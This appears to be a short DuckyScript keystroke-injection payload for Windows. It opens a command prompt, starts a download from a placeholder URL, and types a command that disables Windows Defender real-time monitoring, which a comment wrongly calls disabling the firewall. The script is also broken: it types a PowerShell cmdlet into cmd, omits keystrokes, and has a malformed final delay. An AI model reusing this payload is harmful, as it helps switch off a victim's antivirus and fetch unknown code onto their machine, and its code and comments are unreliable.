DELAY 500
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER 
DELAY 500
STRING start "" "enter url for any download"
DELAY 500
ENTER
GUI r
DELAY 500
STRING cmd
DELAY 500
STRING Set-MpPreference -DisableRealtimeMonitoring $true //disables firewall
DELAY 500
STRING cmd
DELAY 500
STRING cd "Download Name"
DELAY500 
